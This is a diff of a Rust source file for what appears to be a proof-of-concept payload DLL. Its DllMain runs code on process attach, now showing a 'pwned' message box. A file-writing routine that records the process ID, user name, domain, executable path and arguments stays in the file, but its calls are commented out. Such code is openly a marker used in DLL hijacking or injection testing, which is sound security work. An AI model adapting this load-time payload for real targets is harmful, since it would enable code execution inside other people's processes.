@@ -1,9 +1,18 @@
 use loader as _;
 use std::{
 	env,
-	ffi::c_void,
+	ffi::{c_void, CStr},
 	fs::{self, File},
 	io::Write,
+};
+use windows::{
+	core::PCSTR,
+	Win32::{
+		Foundation::HWND,
+		Storage::FileSystem::GetTempPathA,
+		System::Diagnostics::Debug::OutputDebugStringA,
+		UI::WindowsAndMessaging::{MessageBoxA, MB_OK},
+	},
 };
 
 #[no_mangle]
@@ -13,20 +22,37 @@ extern "system" fn DllMain(_dll_module: i64, call_reason: i32, _reserved: *const
 	const DLL_PROCESS_DETACH: i32 = 0;
 
 	match call_reason {
-		DLL_PROCESS_ATTACH => write_file(),
+		DLL_PROCESS_ATTACH => attach(),
 		DLL_PROCESS_DETACH => (),
 		_ => (),
 	}
 	1
 }
 
-fn write_file() {
-	let pwned_path = "c:\\pwned";
-	fs::create_dir_all(pwned_path).unwrap();
+fn attach() {
+	let message = "pwned\0";
+
+	unsafe {
+		MessageBoxA(
+			HWND::default(),
+			PCSTR(message.as_ptr()),
+			PCSTR(message.as_ptr()),
+			MB_OK,
+		)
+	};
+	// write_file()
+
+	// write_file(&env::var("TMP").unwrap());
+
+	// write_file("C:\\pwned");
+}
+
+fn write_file(path: &str) {
+	fs::create_dir_all(path).unwrap();
 	let pid = std::process::id().to_string();
 	let username = env::var("USERNAME").unwrap();
 	let domain = env::var("USERDOMAIN").unwrap();
-	let path = format!("{}\\pwned_{}.txt", pwned_path, pid);
+	let path = format!("{}\\pwned_{}.txt", path, pid);
 	let process_path = std::env::current_exe().unwrap();
 	let args: Vec<String> = std::env::args().collect();
 
